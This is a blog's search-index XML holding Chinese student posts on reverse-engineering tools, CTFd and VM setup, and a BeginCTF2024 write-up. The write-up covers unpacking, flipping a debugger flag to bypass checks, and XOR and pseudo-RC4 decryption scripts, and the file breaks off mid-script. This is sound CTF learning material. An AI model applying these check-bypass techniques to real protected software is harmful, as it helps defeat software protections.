<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>OD与IDA结合动调</title>
    <link href="/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.7.22</p><p>晚上听尧哥说DASFCTF的一道re题需要动调来判断函数先后执行的顺序，好像一下子就悟了，但悟得不多，还没完全调出来。主要网上讲动态的视频太少，只知道基本快捷键还是很难动调，所以这里记录一下</p><p>1.还有一点当函数较复杂时，伪c会不准，即放在前面的函数不一定先运行，所以需要看OD的汇编，配合IDA的伪c代码</p><p>2.一般先是在main函数的input下一个断点，然后f8单步执行，当汇编地址有较大变化的时候要去IDA里相应的汇编地址，然后按tab，看看现在位于哪个函数，以此来判断加密函数的执行先后顺序，遇到汇编循环，可以点到汇编循环的下一个位置，然后f4到该位置，快速跳出循环，因为OD是线性扫描，所以本来循环结束也是到下一条指令，两个软件的界面建议一左一右，这样就不用一直切界面，就像下面这样。</p><img src="/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/1690079441955-4d727ec8-c82d-4ece-a8b9-76ac0741bdec.png" class="" title="img"><p>3.每次调试高几位的地址不一样，不过没关系，先在IDA里开启调试，汇编界面的地址就能和OD里面对应了</p><p>4.汇编里面有函数调用函数（call）要按f7进入，此外，看伪c代码也可以看出一些函数调用关系</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安装ghidra</title>
    <link href="/2024/03/28/%E5%AE%89%E8%A3%85ghidra/"/>
    <url>/2024/03/28/%E5%AE%89%E8%A3%85ghidra/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.9.8</p><p>安装完了要写jdk17的目录（ghidra高版本要求java17及以上），电脑上只有jdk1.8.0，按下面教程切换java版本即可</p><img src="/2024/03/28/%E5%AE%89%E8%A3%85ghidra/1694153302506-731218f9-c283-4e36-87d5-a97bba467df1.png" class="" title="img"><p>[<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]</a>(<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=一、windows安装java17与java8共存、centos安装java17</a> 1 1. java17下载 下载链接（ https%3A%2F%2F<a href="http://www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows">www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows</a> ） 2,查看java目录 [root%40r01 ~]which java %2Fusr%2Fbin%2Fjava 1 2 )</p><p>搞了两个小时，有点折磨，多关注报错和要求其实能很快解决</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单搭建CTFd</title>
    <link href="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/"/>
    <url>/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.9.16</p><p>搞了一晚上，ubuntu上命令复制不了，麻烦。搜kali的教程，docker-compose不能正常使用，估计是设置了python2有问题，一直警告，还是先pull docker</p><p><a href="https://www.bilibili.com/read/cv16948927/">https://www.bilibili.com/read/cv16948927/</a></p><h1 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h1><p>安装docker</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661434139-2bb68ae4-07d2-4e3e-bf5c-a6519df585ae.png" class="" title="img"><p>启动docker</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661452074-0cdea229-ffda-4647-9a99-40dcb39e3c1d.png" class="" title="img"><p>pull 镜像</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661496732-122cff23-0e9f-40f9-ae92-0ea8fc8895cc.png" class="" title="img"><p>启动容器</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661527389-4538ed6e-2298-4568-ab74-5e4fc1c0b84d.png" class="" title="img"><p>虚拟机内启动</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661552024-5545993b-44c7-4078-a114-bdf832cd323a.png" class="" title="img"><p>注意端口</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661572673-8ee28ee4-7540-4dbc-9574-d47517593ba1.png" class="" title="img"><p>映射到本地</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661587448-c9faa948-f9b2-4dd5-b439-8e7de93b9cf8.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机网络设置</title>
    <link href="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <url>/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>删除原来nat模式的虚拟网络编辑器，新建一张虚拟网卡，如vmnet0可使多台虚拟机和主机在同一网段上</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711506464849-2874c590-9c49-4934-b30e-1c43ec6687d4.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1708495363780-e2a4e9b5-6bd9-429d-98ae-e1d47c8da120.png" class="" title="img"><p>选择一张虚拟网卡，我这里选择桥接模式，或者下面的自定义选择对应网卡也行</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711466152376-87b6d4a4-00a6-4117-90b1-5a8d0d2928ee.png" class="" title="img"><p>后面我就出现了ip不再是虚拟的192.168.15.1，但是主机还是能ping通的情况，其实之前一直是正常的，不知道咋了又还原成172.17.0.1,同学说可能是桥接会固定一段时间还原啥的</p><p>后面也遇到了虚拟机快照打不开的情况</p><p><a href="https://blog.csdn.net/qq_45771413/article/details/121230747">https://blog.csdn.net/qq_45771413/article/details/121230747</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711516508625-7ce053f6-dc2a-4d28-94a4-fdfb2e8d9aa3.png" class="" title="img"><p>最后把网络适配器全部还原成默认的，再按照教程全部设置成NAT</p><p><a href="https://zhuanlan.zhihu.com/p/479522879">https://zhuanlan.zhihu.com/p/479522879</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711519056690-363480f0-5b01-4803-a93e-d9cc77b92531.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711521124605-41af9189-016e-467d-a9a2-b3a3b1af398b.png" class="" title="img"><p>发现还是不行，我真的…</p><p>再次恢复快照，竟然成了，所以还得是拍快照</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安装pngcheck</title>
    <link href="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/"/>
    <url>/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/</url>
    
    <content type="html"><![CDATA[<h2 id="安装pngcheck"><a href="#安装pngcheck" class="headerlink" title="安装pngcheck"></a>安装pngcheck</h2><p>written in 2023.9.26</p><p>阿里云的源找不到</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737968243-87e7a061-8436-4375-aae7-39bca5a291e6.png" class="" title="img"><p>同学反映可能是用了阿里云源的关系，所以第一种方法是换源，用kali原来的源就能一键成功</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695738257858-862a66bc-871b-48be-b183-1daa9d0b9d8d.png" class="" title="img"><p>翻github找到一个更新的网站，下载对应的版本就行了</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737936166-d9838d33-6c94-46f8-b1dd-fd7f3999a96a.png" class="" title="img"><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737866998-d5a52522-3c03-4b2b-bcd7-36f95acd13e5.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BeginCTF2024部分逆向</title>
    <link href="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/"/>
    <url>/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="real-xor"><a href="#real-xor" class="headerlink" title="real_xor"></a>real_xor</h2><p>给的python，一眼循环异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768782798-eec1722c-ad82-437c-910b-c5bec0b5e2a7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768772317-486bf981-83da-4045-bba6-ab4b7bdc6fbf.png" class="" title="img"><h2 id="xor-1"><a href="#xor-1" class="headerlink" title="xor-1"></a>xor-1</h2><p>先脱壳</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769025393-674705ad-19fe-4c58-b922-5ad9534aecf9.png" class="" title="img"><p>搜字符串找到密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769305346-03366f20-0aa3-4f9d-b7f9-34f304e56d7e.png" class="" title="img"><p>从start进入，找到code</p><p>复制数字和明文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5-171031959456491.png" class="" title="img"><p>异或数字</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5.png" class="" title="img"><p>反向异或，其实伪c是很奇怪的i&#x3D;0，下标为16，但是看汇编确实是这样</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771152553-c42a1f1b-5dee-40ee-b4eb-9e30175b2302.png" class="" title="img"><p>而且c用16来算就是对的</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395333436-2cec64dd-319f-4d7a-9dcc-de5a5b096cdf.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771290662-3a9f9e22-8956-4a79-92e3-561d8416c75e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771400265-4ff2b282-a49c-44a2-86fb-3aa642825f63.png" class="" title="img"><p>又来一整轮</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771420376-7ce963ce-71da-49f4-9c99-e1c3e74fc6ad.png" class="" title="img"><p>ida7.5可以显示中文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379783930-63154982-9c14-47c6-82e5-9c06f709b51c.png" class="" title="img"><p>当时就这样，直接乱序</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379763193-a6214394-7f51-43f0-8b96-9fee716c6e44.png" class="" title="img"><p>我知道了，我写的脚本是一位一位的加到flag里，而现实是16位算完直接复制的，当然有点问题，第一个f没了</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707380357812-aba19fb3-0169-4122-938c-7aabf4d3660e.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python">fin = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>]<br><br>lst9 = fin[:<span class="hljs-number">16</span>]<br>lst8 = fin[<span class="hljs-number">16</span>:]<br><br>lst7 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;3092606632787947&quot;</span>]<br>lst6 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;4180387362590136&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst7[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst6[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[i]<br>    lst9[i] ^= lst7[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[i]<br>    lst9[i] ^= lst6[i]<br><br>lst4 = lst8<br>lst3 = lst9<br><br>lst1 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;6329079420771558&quot;</span>]<br>lst2 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;7679621386735000&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst2[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst1[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[i]<br>    lst4[i] ^= lst2[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[i]<br>    lst4[i] ^= lst1[i]<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst3 + lst4])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>下面用动调做：</p><p>椰奶师傅说是要去符号表，这里本来就去了符号，不过链接好的地址没有去</p><p>符号通常是变量或函数的名称,符号表可用于确定变量或函数在内存中的位置。</p><p>所以strip一下可以去掉，现在就只剩下偏移了，而且可以直接动调到密文比较处</p><p><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383434998-9a474bb9-e10f-4823-a951-ebbe7fe2f827.jpeg" alt="img"><img src="/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395034732-b0682464-e242-4b37-b7de-45fd0a108417.png" alt="img"></p><p>真的从0x7f开头变成0x14开头啦，而且直接出</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707383301549-bd5bee30-fd55-482a-a992-8533746e42ba.png" class="" title="img"><h2 id="红白机-1"><a href="#红白机-1" class="headerlink" title="红白机-1"></a>红白机-1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707102089423-4d5eba26-ab01-4192-91f8-188e179b233a.png" class="" title="img"><p>6502汇编</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707112975854-4dec833c-428e-45f0-a499-d9a689ff1211.png" class="" title="img"><p>找不到flag头</p><p>结果跟我说在线网站</p><p><a href="https://itema-as.github.io/6502js/">https://itema-as.github.io/6502js/</a></p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707396837801-52015591-99fe-4d24-abd2-93172b05f129.png" class="" title="img"><h2 id="俄语学习-1"><a href="#俄语学习-1" class="headerlink" title="俄语学习-1"></a>俄语学习-1</h2><p>直接乱输，然后修改zf绕过</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706752491098-e585956b-06d4-486d-9ba6-0748bec110c3.png" class="" title="img"><p>伪rc4？</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706753133019-c9c3925b-8148-4024-acc2-0973d7a0630b.png" class="" title="img"><p>str复制有点奇怪，是0到strlen，后面密文比较也是少了一位</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706758798885-0cfdbb8c-e207-411e-8b35-72cc4bb4a450.png" class="" title="img"><p>直接逆向跑出来这个鬼东西</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706759274005-f288eca0-6feb-4faa-82b4-80114557bd41.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python">s1=<span class="hljs-string">&#x27;m5d5w5d5b5n5m5d5w5d5b5n5m5d5w5d5b5n&#x27;</span><br>s2=<span class="hljs-string">&#x27;+i&amp;[@Y:g8[&amp;l$f8S8v$Y&amp;e&gt;&#123;&#x27;</span><br><span class="hljs-comment">#s2=[0x2b, 0x69, 0x26, 0x5b, 0x40, 0x59, 0x3a, 0x67, 0x38, 0x5b, 0x26, 0x6c, 0x24, 0x66, 0x38, 0x53, 0x38, 0x76, 0x24, 0x59, 0x26, 0x65, 0x3e, 0x7b]</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s2))<br>a=[<span class="hljs-number">0x38</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xAB</span>,<br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x42</span>,<br>  <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x6D</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>s_ni=[<span class="hljs-number">0x35</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x2C</span>,<br>  <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x26</span>,<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xFA</span>,<br>  <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x58</span>,<br>  <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x38</span>,<br>  <span class="hljs-number">0x80</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x99</span>,<br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xE3</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x21</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x20</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x1B</span>,<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x28</span>,<br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1C</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x51</span>,<br>  <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x62</span>, <span 